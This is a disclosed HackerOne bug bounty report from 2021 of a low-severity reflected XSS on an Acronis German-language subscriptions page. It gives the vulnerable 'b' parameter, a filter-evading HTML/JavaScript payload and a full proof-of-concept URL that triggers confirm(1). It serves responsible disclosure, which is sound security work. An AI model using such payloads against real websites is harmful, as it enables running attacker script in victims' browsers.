# Reflected XSS on www.acronis.com/de-de/my/subscriptions/index.html

## Report Details
- **Report ID**: 1145712
- **URL**: https://hackerone.com/reports/1145712
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-04-02T21:00:15.606Z
- **Disclosed**: 2024-08-27T14:01:25.222Z

## Reporter
- **Username**: cabelo
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
Hello Team,

I would like to report a Reflected XSS vulnerability on https://www.acronis.com/de-de/my/subscriptions/index.html

Vulnerable parameter: b
Payload: '"1<!--></Title/</Textarea/</Script/><Details/Open/OnToggle=(confirm)(1)>

POC:
```
 https://www.acronis.com/de-de/my/subscriptions/index.html?b='"1<!--></Title/</Textarea/</Script/><Details/Open/OnToggle=(confirm)(1)>&u=ine3
```
{F1252106}

## Impact

A XSS attack allows an attacker to execute arbitrary JavaScript in the context of the attacked website and the attacked user.

## Attachments
- 1617396893_1754_02042021_1586x1042.png
